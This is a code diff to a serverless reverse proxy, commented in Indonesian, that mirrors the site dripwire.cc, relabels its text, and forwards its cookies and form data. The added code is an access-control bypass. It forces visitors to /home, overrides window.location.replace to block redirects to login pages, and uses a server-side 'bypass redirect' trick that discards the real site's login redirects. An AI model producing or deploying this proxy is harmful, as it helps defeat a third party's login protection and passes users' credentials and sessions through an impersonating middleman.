@@ -32,11 +32,26 @@ function buildClientScript() {
   var ORIGIN = ${JSON.stringify(TARGET_ORIGIN)};
   var REPLACEMENTS = ${JSON.stringify(REPLACEMENTS)};
 
-  // 1. BELOKKAN SEMUA REQUEST (Fetch, XHR, Axios) KE DOMAIN KITA
+  // 1. PAKSA PINDAH KE /HOME (Client-side)
+  if (window.location.pathname === "/" || window.location.pathname === "/index.html" || window.location.pathname === "/login") {
+    window.location.replace("/home");
+    return;
+  }
+
+  // 2. CEGAH APLIKASI NGE-REDIRECT BALIK KE HALAMAN DEPAN
+  var _replace = window.location.replace;
+  window.location.replace = function(url) {
+    if (url === "/" || url === "" || url.includes("login")) {
+      console.log("Proxy: Blocked redirect to " + url);
+      return; // Blokir!
+    }
+    return _replace.apply(window.location, arguments);
+  };
+
+  // 3. BELOKKAN SEMUA REQUEST API KE PROXY KITA
   function rewriteUrl(u) {
     if (typeof u !== "string") return u;
     try {
-      // Kalau URL-nya ngarah ke dripwire, potong domainnya biar relative ke proxy kita
       if (u.includes("dripwire.cc")) {
         var urlObj = new URL(u, window.location.origin);
         return urlObj.pathname + urlObj.search + urlObj.hash;
@@ -48,13 +63,10 @@ function buildClientScript() {
   var _fetch = window.fetch;
   window.fetch = function(input, init) {
     try {
-      if (typeof input === "string") {
-        input = rewriteUrl(input);
-      } else if (input && input.url) {
+      if (typeof input === "string") input = rewriteUrl(input);
+      else if (input && input.url) {
         var newUrl = rewriteUrl(input.url);
-        if (newUrl !== input.url) {
-          input = new Request(newUrl, input);
-        }
+        if (newUrl !== input.url) input = new Request(newUrl, input);
       }
     } catch (e) {}
     return _fetch.call(this, input, init);
@@ -67,19 +79,7 @@ function buildClientScript() {
     return _open.apply(this, a);
   };
 
-  if (navigator.sendBeacon) {
-    var _beacon = navigator.sendBeacon.bind(navigator);
-    navigator.sendBeacon = function(u, d) { return _beacon(rewriteUrl(u), d); };
-  }
-
-  // 2. CEGAH DITENDANG BALIK KE HALAMAN DEPAN DARI DALAM SCRIPT
-  var _pushState = history.pushState;
-  history.pushState = function() {
-    if (arguments[2] === "/" || arguments[2] === "") return;
-    return _pushState.apply(this, arguments);
-  };
-
-  // 3. GANTI TEKS DI LAYAR
+  // 4. GANTI TEKS
   function renameText(t) {
     for (var i = 0; i < REPLACEMENTS.length; i++) {
       var p = REPLACEMENTS[i];
@@ -135,7 +135,6 @@ function buildClientScript() {
 }
 
 export default async function handler(req, res) {
-  // Handle CORS
   res.setHeader("Access-Control-Allow-Origin", "*");
   res.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
   res.setHeader("Access-Control-Allow-Headers", "*");
@@ -148,13 +147,12 @@ export default async function handler(req, res) {
   try {
     let path = req.query.path || "";
     
-    // Redirect root
+    // Tendang root ke /home
     if (path === "" || path === "/" || path === "index.html") {
       res.writeHead(302, { Location: "/home", "Cache-Control": "no-store" });
       return res.end();
     }
 
-    // Rekonstruksi URL
     const searchParams = new URLSearchParams();
     for (const [key, value] of Object.entries(req.query)) {
       if (key !== "path") searchParams.append(key, value);
@@ -162,7 +160,6 @@ export default async function handler(req, res) {
     const query = searchParams.toString() ? `?${searchParams.toString()}` : "";
     const targetUrl = `${TARGET_ORIGIN}/${path}${query}`;
 
-    // Teruskan header
     const fwd = {};
     for (const [key, value] of Object.entries(req.headers)) {
       if (!["host", "connection", "content-length", "accept-encoding"].includes(key.toLowerCase())) {
@@ -176,7 +173,6 @@ export default async function handler(req, res) {
       fwd["referer"] = req.headers["referer"].replace(ourOrigin, TARGET_ORIGIN);
     }
 
-    // Handle Body (Benerin Form & JSON)
     let body;
     if (!["GET", "HEAD"].includes(req.method)) {
       if (req.body === undefined) {
@@ -189,7 +185,6 @@ export default async function handler(req, res) {
       } else if (Buffer.isBuffer(req.body) || typeof req.body === "string") {
         body = req.body;
       } else {
-        // Vercel udah parse body-nya
         const contentType = req.headers["content-type"] || "";
         if (contentType.includes("application/x-www-form-urlencoded")) {
           body = new URLSearchParams(req.body).toString();
@@ -207,7 +202,6 @@ export default async function handler(req, res) {
       redirect: "manual",
     });
 
-    // Teruskan Cookie
     let setCookies = [];
     if (typeof upstream.headers.getSetCookie === "function") {
       setCookies = upstream.headers.getSetCookie();
@@ -219,10 +213,18 @@ export default async function handler(req, res) {
       res.setHeader("set-cookie", setCookies.map(stripCookieDomain));
     }
 
-    // Redirect dari upstream
+    // ===== TRIK BYPASS REDIRECT =====
+    // Kalau server asli nyoba nendang kita ke "/", kita BLOKIR redirect-nya.
     if ([301, 302, 303, 307, 308].includes(upstream.status)) {
       const loc = upstream.headers.get("location") || "/";
       const rel = loc.startsWith(TARGET_ORIGIN) ? loc.slice(TARGET_ORIGIN.length) || "/" : loc;
+      
+      if (rel === "/" || rel === "" || rel.includes("login")) {
+        // Abaikan perintah redirect dari server, balikin halaman kosong atau lanjut
+        res.writeHead(200, { "Content-Type": "text/html" });
+        return res.end("<html><body><script>window.location.reload()</script></body></html>");
+      }
+      
       res.writeHead(upstream.status, { Location: rel, "Cache-Control": "no-store" });
       return res.end();
     }
